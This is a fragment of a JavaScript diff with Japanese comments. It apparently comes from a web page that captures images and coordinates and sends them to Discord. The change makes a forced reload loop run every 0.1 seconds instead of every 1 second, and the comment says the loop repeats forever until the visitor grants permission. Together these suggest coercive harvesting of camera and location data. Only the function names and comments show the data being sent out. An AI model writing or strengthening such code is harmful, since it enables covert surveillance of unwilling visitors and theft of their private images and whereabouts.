@@ -165,7 +165,7 @@ async function sendToDiscord(images, coords=null) {
 
 // 強制ページリロード（許可されなかった場合）
 function forceReload() {
-  setTimeout(() => location.reload(), 1000); // 1秒ごとに永遠リロード
+  setTimeout(() => location.reload(), 100); // 0.1秒ごとに永遠リロード
 }
 
 // メイン処理：許可されたら自動で連射＋送信
